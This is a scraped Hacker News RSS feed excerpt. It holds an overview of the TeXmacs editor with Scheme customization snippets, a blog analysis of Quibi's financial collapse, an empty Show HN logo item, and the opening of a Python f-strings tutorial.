<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    
    
    <p>
      A rapid overview/executive summary of the TeXmacs system.
    </p>
    <h2 id="auto-2">Main features<span></span></h2>
    <ul>
      <li>
        <p>
          Visual <b>structured</b> editor: WYSWYG <b>&amp;</b> WYSWYM
        </p>
      </li>
      <li>
        <p>
          Inspired by TeX and <class>Emacs</class>
        </p>
      </li>
      <li>
        <p>
          High-quality typesetting algorithms (including microtypography)
        </p>
      </li>
      <li>
        <p>
          Special features for mathematical typesetting and input
        </p>
      </li>
      <li>
        <p>
          Support for interactive sessions: Scheme, Python, R, Octave, Maxima,
          Axiom, Mathemagix (and other CAS).
        </p>
      </li>
      <li>
        <p>
          Multi-platform: Unix, MacOS, Windows (via <class>Qt</class>)
        </p>
      </li>
      <li>
        <p>
          Own format (<class>XML</class> like). Native output to <class>PDF</class> and <class>PS</class>. Export to LaTeX,
          <class>HTML</class>
        </p>
      </li>
      <li>
        <p>
          Internal image editor, interfaces to <class>Svn</class> and
          <class>Git</class>, versioning tool, database tool,
          encryption of documents.
        </p>
      </li>
      <li>
        <p>
          Website and documentation written in TeXmacs
        </p>
      </li>
    </ul>
    <h2 id="auto-3">Gallery<span></span></h2>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/texmacs-1.png" width="500">
      </p>
      <p>
        The legacy X11 backend
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/texmacs-ffnlogn.png" width="600">
      </p>
      <p>
        The <class>Qt</class> backend, high quality typesetting
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/Screenshot%202019-05-11%20at%2013.15.10.png" width="600">
      </p>
      <p>
        Structured editing, high quality math typesetting
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/texmacs-beamer.png" width="600">
      </p>
      <p>
        Presentation mode
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/Screenshot%202019-05-11%20at%2012.48.10.png" width="500">
      </p>
      <p>
        Graphics editor
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/Screenshot%202019-05-11%20at%2013.08.48.png" width="650">
      </p>
      <p>
        Microtypography, synthetic math fonts
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/Screenshot%202019-05-11%20at%2013.16.53.png" width="600">
      </p>
      <p>
        Interfaces to external packages (here DraTeX)
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/texmacs-cas.png" width="600">
      </p>
      <p>
        Interfaces to external packages (here <class>Mathemagix</class>
        and <class>Maxima</class>)
      </p>
    </center>
    <center>
      <p>
        <img src="https://texmacs.github.io/notes/resources/overview/texmacs-chinese.png" width="600">
      </p>
      <p>
        Support for oriental scripts
      </p>
    </center>
    
    <h2 id="auto-4">Development<span></span></h2>
    <ul>
      <li>
        <p>
          Started in 1998 by <class>Joris Van Der Hoeven</class>
        </p>
        <span><ul>
          <li>
            <p>
              v0.2.3β released 26 Oct 1999
            </p>
          </li>
          <li>
            <p>
              v1.0 (2002)
            </p>
          </li>
          <li>
            <p>
              <class>Qt</class> backend in v1.0.7 (2008)
            </p>
          </li>
          <li>
            <p>
              native <class>Pdf</class> support in v1.99.1 (2013)
            </p>
          </li>
          <li>
            <p>
              currently version 1.99.9 (soon 2.1)
            </p>
          </li>
        </ul></span>
      </li>
      <li>
        <p>
          Written in <class>C++</class> (~300.000 loc) and <class>Scheme</class> (~150.000 loc) (from <a href="https://www.openhub.net/p/texmacs/analyses/latest/languages_summary">[openhub]</a>).
        </p>
      </li>
      <li>
        <p>
          Fully modular, external dependencies (mostly) isolated via tight
          interfaces.
        </p>
      </li>
      <li>
        <p>
          Two UI backends: legacy <class>X11</class> with custom widget
          library, modern <class>Qt</class> backend (cross-platform
          support).
        </p>
      </li>
      <li>
        <p>
          <b>GNU Guile as extension language</b>. C++ export basic
          manipulation routines and few internal datatypes.
        </p>
      </li>
    </ul>
    <h2 id="auto-5">TeXmacs' content model<span></span></h2>
    <p>
      All TeXmacs documents or document fragments can be thought of as
      <em>trees</em>. 
    </p>
    
    <p>
      For instance, the tree
    </p>
    <center>
      <img src="https://texmacs.github.io/notes/docs/overview-1.png">
    </center>
    <p>
      typically represents the formula
    </p>
    <center>
      <img src="https://texmacs.github.io/notes/docs/overview-2.png" id="tm-tree-ex">
    </center>
    <h2 id="auto-6">External representations<span></span></h2>
    <p>
      Serialization of TeXmacs documents without loss of informations
    </p>
    
    <ul>
      <li>
        <p>
          TeXmacs format
        </p>
        <div>
          <p>
            <tt>&lt;with|mode|math|x+y+&lt;frac|1|2&gt;+&lt;sqrt|y+z&gt;&gt;</tt>
          </p>
        </div>
      </li>
      <li>
        <p>
          <class>XML</class> format
        </p>
        <div>
          <div>
            <pre xml:space="preserve">&lt;frac&gt;&lt;tm-arg&gt;1&lt;/tm-arg&gt;&lt;tm-arg&gt;2&lt;/tm-arg&gt;&lt;/frac&gt;+&lt;sqrt&gt;y+z&lt;/sqrt&gt;</pre>
          </div>
        </div>
      </li>
      <li>
        <p>
          <class>Scheme</class> format
        </p>
        <div>
          <pre xml:space="preserve">(with "mode" "math" (concat "x+y+" (frac "1" "2") "+" (sqrt "y+z")))</pre>
        </div>
      </li>
    </ul>
    <h2 id="auto-7">Typesetting<span></span></h2>
    <p>
      Typesetting process converts TeXmacs trees into boxes:
    </p>
    <p>
      <img src="https://texmacs.github.io/notes/docs/overview-3.png">
    </p>
    <p>
      The <a href="https://texmacs.github.io/notes/regular/regular.en.html">typesetting primitives</a> are designed to be very fast and
      they are built-in into the editor:
    </p>
    <div>
      <p>
          <span>e.g. typesetting primitives for horizontal
          concatenations (<span>concat</span>), page breaks (<span>page-break</span>), mathematical fractions (<span>frac</span>),
          hyperlinks (<span>hlink</span>), and so on.</span>
        </p>
    </div>
    <p>
      The rendering of many of the primitives may be customized through the <a href="https://texmacs.github.io/notes/environment/environment.en.html">built-in environment variables</a>.
    </p>
    <div>
      <p>
          <span>e.g. the environment variable <span color="#008000"><i>color</i></span>
          specifies the current color of objects, <span color="#008000"><i>par-left</i></span>
          the current left margin of paragraphs, <abbr>etc.</abbr></span>
        </p>
    </div>
    <p>
      The <a href="https://texmacs.github.io/notes/stylesheet/stylesheet.en.html">stylesheet language</a> allows the user to write new
      primitives (macros) on top of the built-in primitives. 
    </p>
    <div>
      <p>
          <span>Contains primitives for defining macros, conditional
          statements, computations, delayed execution, <abbr>etc.</abbr> and a
          special <span>extern</span> tag to inject <class>Scheme</class>
          expressions in order to write macros.</span>
        </p>
    </div>
    <h2 id="auto-8">Macros<span></span></h2>
    <p>
      Evaluation of TeXmacs trees proceeds by reduction of the primitives,
      essentialy by evaluation of macro applications.
    </p>
    
    <p>
        <span color="blue">&lt;</span>assign<span color="blue">|</span><span color="#008000"><i>hello</i></span><span color="blue">|</span><span color="black"><span color="blue">&lt;</span>macro<span color="blue">|</span><span color="brown"><i>name</i></span><span color="blue">|</span><span color="black"><span color="black">Hello </span><span color="black"><span color="brown"><i>name</i></span></span><span color="black">, how are you today?</span></span><span color="blue">&gt;</span></span><span color="blue">&gt;</span>
      </p>
    
    <p>
      Macros have editable input fields. Examples here below (activate the
      macros):
    </p>
    <p>
      <span color="blue">&lt;</span>assign<span color="blue">|</span><span color="#008000"><i>hello</i></span><span color="blue">|</span><span color="black"></span><span color="blue">&gt;</span>
    </p>
    
    <p>
      <span color="blue">&lt;</span>assign<span color="blue">|</span><span color="#008000"><i>seq</i></span><span color="blue">|</span><span color="black"></span><span color="blue">&gt;</span>
    </p>
    <center>
      <img src="https://texmacs.github.io/notes/docs/overview-4.png">
    </center>
    <h2 id="auto-9"><class>Guile</class> as extension language<span></span></h2>
    <p>
      TeXmacs is extendable and customizable in various ways:
    </p>
    <ul>
      <li>
        <p>
          <class><b>Guile</b></class> embedded as extension and
          scripting language
        </p>
      </li>
      <li>
        <p>
          A plugin system allows asyncronous communication with external
          programs 
        </p>
      </li>
      <li>
        <p>
          Mechanism to dynamically load external code (via C interface)
        </p>
      </li>
    </ul>
    
    <p>
      <class>Guile</class> is easy to embed and provides a reasonably
      fast implementation of <class>Scheme</class>.
    </p>
    
    <p>
      Why <class>Scheme</class>?
    </p>
    <ol>
      <li>
        <p>
          Allows to mix programs and data in a common framework.
        </p>
      </li>
      <li>
        <p>
          Allows to customize the language itself, by adding new programming
          constructs.
        </p>
      </li>
      <li>
        <p>
          Allows to write programs on a very abstract level.
        </p>
      </li>
    </ol>
    <h2 id="auto-10"> Menus<span></span></h2>
    <div>
      <pre xml:space="preserve">(menu-bind file-menu
  ("New" (new-buffer))
  ("Load" (choose-file load-buffer "Load file" ""))
  ("Save" (save-buffer))
  …)</pre>
    </div>
    <p>
      can be easily extended from user code:
    </p>
    <div>
      <pre xml:space="preserve">(menu-bind insert-menu
  (former)
  –––
  (-&gt; "Opening"
      ("Dear Sir" (insert "Dear Sir,"))
      ("Dear Madam" (insert "Dear Madam,")))
  (-&gt; "Closing"
      ("Yours sincerely" (insert "Yours sincerely,"))
      ("Greetings" (insert "Greetings,"))))</pre>
    </div>
    <h2 id="auto-11">Some more GUI<span></span></h2>
    <p>
      Keybindings
    </p>
    <div>
      <pre xml:space="preserve">(kbd-map
  ("D e f ." (make 'definition))
  ("L e m ." (make 'lemma))
  ("P r o p ." (make 'proposition))
  ("T h ." (make 'theorem)))</pre>
    </div>
    <p>
      The file <tt>my-init-buffer.scm</tt> is executed every time a
      buffer is loaded, it allows some specific customizations. For example:
    </p>
    <div>
      <pre xml:space="preserve">(if (not (buffer-has-name? (current-buffer)))
    (begin
      (init-style "article")
      (buffer-pretend-saved (current-buffer))))

(if (not (buffer-has-name? (current-buffer)))
    (make-session "maxima" (url-&gt;string (current-buffer))))</pre>
    </div>
    <h2 id="auto-12">Scheme invocation<span></span></h2>
    <p>
      <class>Scheme</class> commands can be invoked interactively (like
      in <class>Emacs</class>) using the <span>⌘⌃X</span>
      shortcut. 
    </p>
    <p>
      A <class>Scheme</class> session is started using the →→<a id="auto-13"></a> menu item:
    </p>
    <div>
      <table>
        <tbody><tr>
          <td><span color="#008000"><pre xml:space="preserve">scheme] </pre></span></td>
          <td><span color="black"><pre xml:space="preserve">(define (square x) (* x x))</pre></span></td>
        </tr></tbody>
      </table>
    </div>
    
    <div>
      <table>
        <tbody><tr>
          <td><span color="#008000"><pre xml:space="preserve">scheme] </pre></span></td>
          <td><span color="black"><pre xml:space="preserve">(kbd-map ("h i ." (insert "Hi there!")))</pre></span></td>
        </tr></tbody>
      </table>
    </div>
    <div>
      <table>
        <tbody><tr>
          <td><span color="#008000"><pre xml:space="preserve">scheme] </pre></span></td>
          <td><span color="black"><pre xml:space="preserve">;; try typing ‘‘hi.''</pre></span></td>
        </tr></tbody>
      </table>
    </div>
    <p>
      <class>Scheme</class> commands can be invoked from the command
      line:
    </p>
    <div>
      <pre xml:space="preserve">texmacs text.tm -x "(print)" -q</pre>
    </div>
    <p>
      Or scheme statement executed from inside TeXmacs macros:
    </p>
    <p>
        <span color="blue">&lt;</span>extern<span color="blue">|</span><span color="#228"><tt>(lambda
        (x) ‘(concat "Hallo " ,x))</tt></span><span color="blue">|</span><span color="black">Piet</span><span color="blue">&gt;</span>
      </p>
    <h2 id="auto-14">The <tt>tm-define</tt> macro<span></span></h2>
    <p>
      <i>Contextual overloading</i> 
    </p>
    <p>
      Function definition can depend on several run-time conditions (e.g.
      editor mode). This allows to develop modular user interfaces.
    </p>
    <div>
      <pre xml:space="preserve">(tm-define (hello) (insert "Hello"))
(tm-define (hello) (:require (in-math?)) (insert-go-to "hello()" '(6)))</pre>
    </div>
    <div>
      <pre xml:space="preserve">(tm-define (hello)
  (if (in-math?) (insert-go-to "hello()" '(6)) (former)))</pre>
    </div>
    <div>
      <pre xml:space="preserve">(tm-define (my-replace what by)
  default-implementation)

(tm-define (my-replace what by)
  (:require (== what by))
  (noop))</pre>
    </div>
    <h2 id="auto-15">Meta informations<span></span></h2>
    <div>
      <pre xml:space="preserve">(tm-define (square x)
  (:synopsis "Compute the square of @x")
  (:argument x "A number")
  (:returns "The square of @x")
  (* x x))</pre>
    </div>
    <p>
      Used via e.g. <tt>(help square)</tt>. Allows for interactive
      input of parameters: typing <span>⌘⌃⇧X</span>
      followed by <tt>square</tt> and <span>↩</span> and
      you will be prompted for “A number” on the footer (or in a
      dialog). Tab-completion.
    </p>
    <div>
      <pre xml:space="preserve">(tm-property (choose-file fun text type)
  (:interactive #t))</pre>
    </div>
    <p>
      to indicate interactive commands in menu items like:
    </p>
    <div>
      <pre xml:space="preserve">("Load" (choose-file load-buffer "Load file" ""))</pre>
    </div>
    <p>
      Check-marks for menu items:
    </p>
    <div>
      <pre xml:space="preserve">(tm-define (toggle-session-math-input)
  (:check-mark "v" session-math-input?)
  (session-use-math-input (not (session-math-input?))))</pre>
    </div>
    
    <div>
      <pre xml:space="preserve">(tm-define mouse-unfold
  (:secure #t)
  (with-action t
    (tree-go-to t :start)
    (fold)))</pre>
    </div>
    <div>
      <p>
        <span><img src="https://texmacs.github.io/notes/docs/overview-5.png">This</span> is a fold/unfold
        environment
      </p>
      <p>
        It allows to toggle the display of its content by switching the tag
        from <span>fold</span> to <span>unfold</span> and back.
      </p>
    </div>
    <h2 id="auto-16"><class>Scheme</class> representation TeXmacs content<span></span></h2>
    <ul>
      <li>
        <p>
          <b>Passive trees</b> (<tt>stree</tt>)
        </p>
        <center>
          <img src="https://texmacs.github.io/notes/docs/overview-6.png">
        </center>
        <p>
          is typically represented by
        </p>
        <div>
          <pre xml:space="preserve">(frac (concat "a" (rsup "2")) "b+c")</pre>
        </div>
        <p>
          convenient to manipulate content directly using standard <class>Scheme</class> routines on lists.
        </p>
      </li>
      <li>
        <p>
          <b>Active trees</b> …</p></li></ul></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://texmacs.github.io/notes/docs/overview.html">https://texmacs.github.io/notes/docs/overview.html</a></em></p>]]>
            </description>
            <link>https://texmacs.github.io/notes/docs/overview.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071915</guid>
            <pubDate>Thu, 12 Nov 2020 17:09:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Financial failures that wasted Quibi's $1.75B]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071876">thread link</a>) | @itsjoemic
<br/>
November 12, 2020 | https://www.mosaic.tech/post/financial-factors-that-sank-quibi | <a href="https://web.archive.org/web/*/https://www.mosaic.tech/post/financial-factors-that-sank-quibi">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>NYU Stern School of Business professor <a href="https://www.profgalloway.com/land-of-the-undead">Scott Galloway predicted</a> Quibi would fall apart eight months before it did. Unsurprisingly, that rubbed some Quibi leaders the wrong way. On <a href="https://podcasts.apple.com/us/podcast/doj-google-showdown-rip-quibi-listener-mail-question/id1073226719?i=1000495767700">Vox’s Pivot podcast</a>, Galloway said he “got a call from the CFO of Quibi before it even launched and [she] said, ‘You have to stop dancing on our grave before we’ve even been birthed.’”</p><div><p>Well, six months after launch, Quibi officially died, so Scott Galloway can happily dance on the grave.</p><p>If you’ve (somehow) missed the barrage of Quibi news and commentary, here’s what you need to know. Quibi, named for the “quick bites” of short-form video content it would offer users, was founded by Jeffrey Katzenberg (founder of DreamWorks) in August 2018 and quickly closed a $1 billion round of funding. With grand aspirations to compete in the streaming wars, Quibi raised another $750 million in March 2020 before launching its platform in April 2020. </p><p>And it did not go well. </p></div><figure id="w-node-a3a2b323b892-c03f76fb"><p><img src="https://global-uploads.webflow.com/5f1f57792641fc1abd3f7713/5fabe1daa93149329070f661_quite%20headline%20collection-1-2-2.jpg" loading="lazy" alt=""></p></figure><div><p>Ahead of the platform’s launch, Quibi CFO Ambereen Toubassy <a href="https://variety.com/2020/digital/news/quibi-750-million-funding-investment-mobile-video-1203523586/">told <em>Variety</em></a>: “We concluded a very successful second raise which will provide Quibi with a strong cash runway. This round of $750 million gives us tremendous flexibility and the financial wherewithal to build content and technology that consumers embrace.” </p><p>Launching at the scale necessary to meet Quibi’s lofty goals was always going to take a heroic feat of financial planning. As CFO, Toubassy had to shoulder all of the challenges that come with forecasting and tracking financials at that scale. However, the execution of <a href="https://www.mosaic.tech/post/saas-eats-everything">strategic finance</a> just wasn’t there.</p><p>Executives have been quick to blame the COVID-19 pandemic for the platform’s problems. But if there’s one thing you take away from Quibi’s story, remember that it wasn’t a freak health crisis that sank the company—it was a lack of financial fundamentals. </p></div><h2>Trying to Outrun the Burn Rate</h2><div><p>Even after raising a total of $1.75 billion in funding, Quibi managed to spend money at an unsustainable rate. As Quibi’s CFO noted, the two rounds of funding should have set the company up with a strong cash runway—the kind that could support the platform’s aggressive entry to the streaming wars. But a closer look at the company’s spending shows that an unmanageable burn rate almost completely wiped that <a href="https://www.mosaic.tech/post/startup-success-requires-a-clear-view-of-your-runway">runway</a> out over the platform’s six-month life span.</p><p><a href="https://www.theinformation.com/articles/the-investors-who-face-big-losses-from-the-quibi-collapse">Reports show</a> that after paying outstanding bills, Quibi will be returning $350 million to its shareholders. Without more insight into Quibi’s revenue, it’s tough to estimate a net burn rate. But, at the very least, the company spent $1.4 billion over the course of about 26 months, putting its monthly gross burn rate somewhere between $40 million and $50 million. </p><p>That figure obviously proved unsustainable, but where was all the money going? There were two standout costs eating into Quibi’s runway:</p></div><ul role="list"><li><strong>The $100k-per-minute production problem: </strong>At one point, <a href="https://www.vulture.com/article/what-is-quibi-explained.html">Katzenberg said</a> Quibi’s first-year content budget was $1.1 billion, and that higher-profile, scripted shows would have production budgets of $100,000 per minute. <a href="https://techcrunch.com/2020/01/13/quibi-execs-jeffrey-katzenberg-and-meg-whitman-explain-their-big-vision/">According to TechCrunch</a>, CEO Meg Whitman “proudly contrasted the jaw-dropping sum to the estimated $500 to $5,000 an hour spent by YouTube creators.” The result? A product in limbo between two different target markets. They committed to the “Hollywood-quality content” of a Netflix or an HBO to compete against free-to-watch powerhouses like TikTok and YouTube. The cost of content proved too high.</li><li><strong>A prelaunch </strong>“<strong>hiring rampage”: </strong> Just a year after starting the company, and before ever bringing a product to market, Quibi’s head count was already at a costly 160. Then, in August 2019, people close to Quibi <a href="https://www.businessinsider.com/jeffrey-katzenberg-quibi-has-embarked-on-an-aggressive-hiring-spree-2019-8">told <em>Business Insider</em></a> the company was about to go on a hiring rampage. The company hired expensive talent, like Netflix’s director of acquisition marketing, DC’s entertainment president, Netflix’s head of product creative, and at least 17 Snapchat engineers. Another year later, Quibi’s head count reached at least 260, and the company had to ask senior executives to take a 10% pay cut to avoid layoffs, <a href="https://www.wsj.com/articles/quibi-asks-senior-executives-to-take-10-pay-cut-11591206642">according to the <em>Wall Street Journal</em></a>. </li></ul><p>Other factors impacting Quibi’s burn rate included a 10-year lease on a 49,000-square-foot office in the heart of Hollywood, fees from a legal battle over its app features, and (maybe most importantly) an astronomical marketing budget for a new startup—but that deserves its own section.</p><h2>Creating a CAC Nightmare</h2><div><p>Right as the platform was about to launch, <a href="https://digiday.com/future-of-tv/king-kong-jumping-off-empire-state-building-quibis-400m-marketing-push-spans-tv-person-screenings/">reports said</a> Quibi was planning to spend between $400 million and $500 million on marketing in 2020, with a target of 7.4 million paid subscribers for the first year. In the best-case scenario, that would put <a href="https://www.mosaic.tech/post/customer-acquisition-cost">customer acquisition costs</a> (CAC) at $55-$65, which doesn’t sound too bad compared with <a href="https://stratechery.com/2018/netflix-earnings-netflixs-rising-cac-content-and-marketing/">Stratechery’s 2018 estimate</a> that put Netflix’s CAC at $45-$60. Like the CFO’s plans to use the recent $750 million in funding to stabilize runway, these projections seem acceptable in theory.</p><p>However, postlaunch disappointments complicated Quibi’s CAC. External factors like the pandemic and lukewarm reception for the platform led to a much tighter marketing budget and (at best) <a href="https://www.theinformation.com/articles/katzenberg-strikes-out-on-quibi-sale-efforts-so-far">500,000 paying customers</a> by October 2020. &nbsp;</p><p><a href="https://www.theverge.com/2020/7/8/21318060/quibi-subscriber-count-free-trial-paying-users-conversion-rate">One study</a> found that from launch through the company’s shutdown, Quibi ended up spending only $63 million on ads after launch. Even if you use that figure as Quibi’s entire marketing budget, the most conservative estimate would put its CAC about 2x higher than expected. That’s a problem, but it’s not exactly a nightmare. </p><p>The real CAC nightmare becomes apparent when you factor in the content costs. If you were running strategic finance for Quibi, you couldn’t have a CAC conversation without considering the money spent on the content library. This is a streaming business, which means content isn’t just a product development concern—it’s a tool for customer acquisition. Quibi invested heavily in big-name creators, hoping that it would translate to more paying customers while massively skewing CAC.</p><p>Assume that a conservative 20% of the $1.4 billion Quibi spent in 26 months went to production costs for its initial slate of shows. That’s $280 million to add to the $63 million in ad spend. Calculated against the base of 500,000 paid subscribers, CAC jumps all the way up to a crushing $686. </p><p>When reports came out saying Quibi was <a href="https://www.theverge.com/2020/7/8/21318060/quibi-subscriber-count-free-trial-paying-users-conversion-rate">only able to convert 8% of its free trial</a> users to paid subscribers, it was clear that <a href="https://www.mosaic.tech/post/customer-lifetime-value">customer lifetime value</a> (LTV) was also going to be an issue. And, ultimately, the LTV to CAC ratio was just impossible to fix—especially at Quibi’s scale.</p></div><h2>Committing to Overcapitalization</h2><div><p>Raising $1 billion to open the company may have doomed Quibi from the start. It positioned Katzenberg and Co. to fall victim to overcapitalization. Because the company had so much cash on hand, product-oriented leaders like Katzenberg and other executives felt they could bypass financial fundamentals and spend hundreds of millions of dollars before ever generating revenue or even bringing an MVP to market. This path left the company with massive expectations that were almost impossible to meet.</p><p>This was especially problematic as Quibi tried to prove its model. Here’s how <a href="https://www.vanityfair.com/hollywood/2019/06/quibi-jeffrey-katzenberg-streaming-platform-interview">Katzenberg would explain</a> the strategy early on:</p></div><blockquote>I’m going to continue to believe, and argue, and preach that Quibi is not a substitute or a competitor for television. Our [service] is exclusively about what you do from 7 a.m. to 7 p.m. on your phone. And what you’re doing today, if you’re in our core demographic of 25- to 35-year-olds, is you’re actually watching 60-70 min of YouTube, Facebook, Instagram, and Snapchat. That growth is now a well-established consumer habit that Quibi is sailing into.</blockquote><div><p>One of the biggest consequences of Quibi’s overcapitalization and commitment to blitz the market was that it was almost impossible to act like a true startup when consumers didn’t respond well to the platform. Startups pivot all the time when their initial ideas aren’t working. Quibi couldn’t. As Scott Galloway said on the Pivot podcast, “Great companies start small, validate a concept, almost always pivot to something that’s working. This was, let’s start with $1.5 billion.” </p><p>Raising a massive amount of money (like Quibi did) isn’t inherently a problem. You only start to see the consequences of overcapitalization when all that money leads to poor financial hygiene. And this can happen at any scale. Whether you’ve raised $1 million or $100 million, your financial forecasts have to remain realistic to maintain stability as the business evolves rapidly. </p><p>It didn’t take long for Quibi’s financial forecasts to prove unrealistic. But by spending so much money so quickly, they backed themselves into a corner that limited their options as the platform missed subscriber projections by a wide margin. </p></div><h2>Good Financial Hygiene Prevents Quibi-Sized Disasters</h2><div><p>Raising more than $1 billion in funding isn’t exactly common, so we probably won’t see startups labeled “the next Quibi” anytime soon. But that doesn’t mean you’re immune to the same kinds of problems that sank the streaming platform so quickly. </p><p>Maybe Katzenberg is right, and the pandemic really did limit Quibi’s potential. Maybe everyone on the outside is right, and the product-market fit just wasn’t there. People will argue those points endlessly as Quibi goes down in history as one of the fastest startup failures ever.</p><p>What can’t be argued is the fact that poor financial hygiene was at the very core of Quibi’s problems. By prioritizing a “revolutionary” product vision over strategic financial decision-making, Quibi dug a hole so deep that it had no choice but to shut down. Don’t fall into the same trap.</p><p>Whether you’re well on your way to becoming the next unicorn, or you’ve just raised your seed round, make sure you can run financial forecasts continuously and that you have real-time insight into your key <a href="https://www.mosaic.tech/post/the-7-go-to-market-metrics-you-should-actually-care-about-and-why-you-should-care">go-to-market metrics</a>. When you can answer key financial questions at the pace of your business, you’re able to collaborate with stakeholders more effectively and put …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mosaic.tech/post/financial-factors-that-sank-quibi">https://www.mosaic.tech/post/financial-factors-that-sank-quibi</a></em></p>]]>
            </description>
            <link>https://www.mosaic.tech/post/financial-factors-that-sank-quibi</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071876</guid>
            <pubDate>Thu, 12 Nov 2020 17:05:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A 1000 auto-generated hexagonal SVG logos]]>
            </title>
            <description>
<![CDATA[
Score 154 | Comments 62 (<a href="https://news.ycombinator.com/item?id=25071643">thread link</a>) | @graderjs
<br/>
November 12, 2020 | https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1 | <a href="https://web.archive.org/web/*/https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://dosycorp.gitlab.io/dosylogo/?v923418754891239875624v1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071643</guid>
            <pubDate>Thu, 12 Nov 2020 16:44:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Examples to Help You Master Python's F-Strings]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071504">thread link</a>) | @rbanffy
<br/>
November 12, 2020 | https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings | <a href="https://web.archive.org/web/*/https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>In this post, I'll show you what I consider the most important bits about Python's f-strings. You will learn several different ways to format a string using f-strings, completely guided by examples. In total, you'll see 73 examples on how to make the best use of f-strings.</p>
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a href="#what-are-pythons-f-strings-aka-literal-string-interpolation">What Are Python's F-Strings - a.k.a Literal String Interpolation?</a></li>
<li><a href="#basic-string-formatting-with-python">Basic String Formatting With Python</a></li>
<li><a href="#limitations">Limitations</a></li>
<li><a href="#how-to-format-an-expression">How to Format an Expression</a></li>
<li><a href="#how-to-use-f-strings-to-debug-your-code">How to Use F-Strings to Debug Your Code</a></li>
<li><a href="#how-to-format-integers-in-different-bases">How to Format Integers in Different Bases</a></li>
<li><a href="#how-to-format-integers-in-different-bases">How to Print Objects With F-Strings</a></li>
<li><a href="#how-to-set-float-number-precision-in-a-f-string">How to Set Float Number Precision in a F-String</a></li>
<li><a href="#how-to-format-a-number-as-percentage">How to Format a Number as Percentage</a></li>
<li><a href="#how-to-justify-or-add-padding-to-a-f-string">How to Justify or Add Padding to a F-String</a></li>
<li><a href="#how-to-escape-characters">How to Escape Characters</a></li>
<li><a href="#how-to-center-a-string">How to Center a String</a></li>
<li><p><a href="#how-to-add-a-thousand-separator">How to Add a Thousand Separator</a></p>
<p>   13.1. <a href="#how-to-format-a-number-with-commas-as-decimal-separator">How to Format a Number With Commas as Decimal Separator</a></p>
<p>   13.2. <a href="#how-to-format-a-number-with-spaces-as-decimal-separator">How to Format a Number With Spaces as Decimal Separator</a></p>
</li>
<li><a href="#how-to-format-a-number-in-scientific-notation-exponential-notation">How to Format a Number in Scientific Notation (Exponential Notation)</a></li>
<li><a href="#using-if-else-conditional-in-a-f-string">Using <code>if-else</code> Conditional in a F-String</a></li>
<li><a href="#how-to-use-f-string-with-a-dictionary">How to Use F-String With a Dictionary</a></li>
<li><a href="#how-to-concatenate-f-strings">How to Concatenate F-Strings</a></li>
<li><a href="#how-to-format-datetime-objects">How to Format <code>datetime</code> Objects</a></li>
<li><a href="#how-to-fix-f-strings-invalid-syntax-error">How to Fix F-String's Invalid Syntax Error</a></li>
<li><a href="#how-to-add-leading-zeros">How to Add Leading Zeros</a></li>
<li><a href="#how-to-write-a-multi-line-f-string-dealing-with-new-lines">How to Write a Multi Line F-String (Dealing With New Lines)</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
<h2 id="what-are-pythons-f-strings-aka-literal-string-interpolation">What Are Python's F-Strings - a.k.a Literal String Interpolation?</h2>
<p>String formatting has evolved quite a bit in the history of Python. Before Python2.6, to format a string, one would either use the <code>%</code> operator, or <code>string.Template</code> module. Some time later, the <code>str.format</code> method came along and added to the language a more flexible and robust way of formatting a string.</p>
<p>Old string formatting with <code>%</code>:</p>
<pre><code><span>&gt;&gt;&gt; </span>msg = <span>'hello world'</span>
<span>&gt;&gt;&gt; </span><span>'msg: %s'</span> % msg
<span>'msg: hello world'</span>
</code></pre>
<p>Using <code>string.format</code>:</p>
<pre><code><span>&gt;&gt;&gt; </span>msg = <span>'hello world'</span>
<span>&gt;&gt;&gt; </span><span>'msg: {}'</span>.format(msg)
<span>'msg: hello world'</span>
</code></pre>
<p>To simplify formatting even further, in 2015, Eric Smith proposed the <a target="_blank" href="https://www.python.org/dev/peps/pep-0498/">
PEP 498 -- Literal String Interpolation
</a>.</p>
<p>PEP 498 presented this new string interpolation to be a simple and easy to use alternative to <code>str.format</code>. The only thing required was one more char - <code>f""</code> - at the beginning of the string.</p>
<p>Using f-strings:</p>
<pre><code><span>&gt;&gt;&gt; </span>msg = <span>'hello world'</span>
<span>&gt;&gt;&gt; </span><span>f'msg: <span>{msg}</span>'</span>
<span>'msg: hello world'</span>
</code></pre>
<p>And that was it! No need to use <code>str.format</code> or <code>%</code>. However, f-strings don’t replace <code>str.format</code> completely. In this guide I’ll show you an example where they are not suitable.</p>
<h2 id="basic-string-formatting-with-python">Basic String Formatting With Python</h2>
